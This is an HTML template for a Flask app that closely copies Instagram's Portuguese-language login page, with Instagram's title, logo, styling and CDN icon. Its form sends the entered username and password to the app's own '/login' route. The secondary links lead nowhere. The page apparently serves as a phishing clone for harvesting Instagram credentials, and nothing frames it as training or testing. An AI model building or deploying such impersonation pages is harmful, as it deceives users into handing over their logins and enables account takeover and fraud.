<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { max-width: 350px; width: 100%; text-align: center; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 220px; height: auto; display: block; margin: 0 auto; }
        .login-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 20px; margin-bottom: 10px; }
        .login-box form { display: flex; flex-direction: column; gap: 10px; }
        .login-box input { background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; font-size: 14px; outline: none; }
        .login-box input:focus { border-color: #a0a0a0; }
        .login-btn { background-color: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background-color: #dbdbdb; margin: 0 10px; }
        .facebook-login { display: flex; align-items: center; justify-content: center; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin-bottom: 15px; }
        .facebook-login::before { content: url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/dSi4djG8W3K.png'); margin-right: 8px; display: inline-block; width: 16px; height: 16px; }
        .forgot-password { margin-top: 15px; font-size: 12px; color: #00376b; text-decoration: none; }
        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 20px; font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="{{ url_for('static', filename='intagram.png') }}" alt="Instagram Logo">
        </div>
        <div class="login-box">
            <form method="POST" action="/login">
                <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
                <input type="password" name="password" placeholder="Senha" required>
                <button type="submit" class="login-btn">Entrar</button>
            </form>
            <div class="divider">OU</div>
            <a href="#" class="facebook-login">Entrar com o Facebook</a>
            <a href="#" class="forgot-password">Esqueceu a senha?</a>
        </div>
        <div class="signup-box">
            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
        </div>
    </div>
</body>
</html>
